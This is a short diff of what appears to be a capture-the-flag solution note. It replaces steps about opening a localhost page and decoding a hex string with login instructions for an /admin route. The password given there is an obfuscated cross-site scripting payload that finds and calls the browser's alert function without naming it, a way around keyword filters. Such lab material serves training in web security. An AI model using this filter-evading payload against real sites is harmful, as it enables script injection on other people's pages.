@@ -1,7 +1,4 @@
-Run this script:
-<script>
-  window.open('http://localhost:5005/', 'iframe');
-</script>
+Go into /admin route
 
-Type: 93a214db88ec419c2cdee5d96dd72c21d26e440995bb8a824bfa904225b6edf6
-Refresh page and convert hex to ascii
+User : dev=true
+Pass : a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}};self[Object.keys(self)[a()]]("XSS")
